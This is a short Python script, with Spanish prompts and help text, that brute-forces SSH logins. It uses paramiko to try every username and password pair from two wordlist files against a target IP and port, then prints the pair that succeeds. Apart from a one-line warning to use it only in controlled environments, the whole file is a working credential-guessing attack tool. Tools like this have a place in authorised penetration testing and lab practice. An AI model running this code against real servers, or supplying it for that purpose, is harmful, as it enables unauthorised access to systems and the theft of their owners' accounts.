
import paramiko
import os
import sys
import argparse



def parse_args():
    parser = argparse.ArgumentParser(
        prog="Herramienta para ataques de fuerza bruta contra protocolo SSH",
        epilog="No utilizar fuera de entornos controlados",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("-t", "--target", required=True, help="IP a la que va dirigida el ataque")
    parser.add_argument("-p", "--port", required=True, help="Puerto que se va a atacar")
    parser.add_argument("-user", "--user", required=True, help="archivo con nombres de posibles usuarios")
    parser.add_argument("-k", "--key", required=True, help="archivo de contraseñas")

    return parser.parse_args()


def check_if_files_exist(users_file, password_file):
    if not os.path.exists(users_file) or not os.path.exists(password_file):
        return False
    else:
        return True

def extract_users(users_file):
    with open(users_file, "r") as f:
        return [line.strip() for line in f if line.strip()]
    
def extract_passwords(passwords_file):
    with open(passwords_file, "r") as f:
        return [line.strip() for line in f if line.strip()]

def ssh_brute_forcing(target, port, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(target, port=port, username=user, password=password, timeout=3)
        return True
    except paramiko.SSHException:
        return False
    except Exception as e:
        return False
    finally:
        client.close()

def main():
    parser = parse_args()
    if not check_if_files_exist(parser.user, parser.key):
        print("Adios")
    else:
        users = extract_users(parser.user)
        passwords = extract_passwords(parser.key)
        for u in users:
            for p in passwords:
                if ssh_brute_forcing(parser.target, parser.port, u, p):
                    print(f"\nLa combinación exacta para conectarse por SSH es: {u}:{p}")


if __name__ == '__main__':
    main()